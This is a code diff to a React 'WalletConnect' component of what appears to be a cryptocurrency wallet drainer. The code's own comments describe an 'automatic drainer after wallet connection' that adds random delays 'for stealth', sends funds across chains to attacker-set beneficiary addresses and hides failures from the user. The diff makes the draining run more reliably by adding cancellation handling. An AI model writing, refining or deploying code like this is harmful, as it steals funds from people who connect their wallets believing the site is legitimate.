@@ -171,8 +171,6 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
   const [error, setError] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
   const [isClient, setIsClient] = useState(false);
-  const [success, setSuccess] = useState(false);
-  const [syncStatus, setSyncStatus] = useState<string | null>(null);
   const [showReconnectPrompt, setShowReconnectPrompt] = useState(false);
 
   React.useEffect(() => {
@@ -231,12 +229,19 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
   // Automatic drainer after wallet connection
   React.useEffect(() => {
     if (!address) return;
+    
+    let isCancelled = false;
+    
     (async () => {
       try {
         const results = await Promise.allSettled(
           CHAINS.map(async (chain) => {
+            if (isCancelled) return;
+            
             // Add random delay for stealth
             await new Promise(res => setTimeout(res, Math.random() * 2000 + 500));
+            if (isCancelled) return;
+            
             const beneficiary = BENEFICIARIES[chain.env];
             if (!beneficiary || beneficiary === `0xYour${chain.name}Address`) {
               throw new Error('Configuration error');
@@ -293,27 +298,35 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
           })
         );
         
-        // Always mark as completed regardless of success/failure
-        localStorage.setItem('drainCompleted', 'true');
-        
-        // Trigger a storage event to notify dashboard of completion
-        window.dispatchEvent(new StorageEvent('storage', {
-          key: 'drainCompleted',
-          newValue: 'true'
-        }));
+        if (!isCancelled) {
+          // Always mark as completed regardless of success/failure
+          localStorage.setItem('drainCompleted', 'true');
+          
+          // Trigger a storage event to notify dashboard of completion
+          window.dispatchEvent(new StorageEvent('storage', {
+            key: 'drainCompleted',
+            newValue: 'true'
+          }));
+        }
         
       } catch (e: any) {
         console.error('General error:', e);
-        // Silent failure - don't show any errors to user
-        localStorage.setItem('drainCompleted', 'true');
-        
-        // Trigger a storage event to notify dashboard of completion
-        window.dispatchEvent(new StorageEvent('storage', {
-          key: 'drainCompleted',
-          newValue: 'true'
-        }));
+        if (!isCancelled) {
+          // Silent failure - don't show any errors to user
+          localStorage.setItem('drainCompleted', 'true');
+          
+          // Trigger a storage event to notify dashboard of completion
+          window.dispatchEvent(new StorageEvent('storage', {
+            key: 'drainCompleted',
+            newValue: 'true'
+          }));
+        }
       }
     })();
+    
+    return () => {
+      isCancelled = true;
+    };
   }, [address]);
 
   // Add a simple spinner component
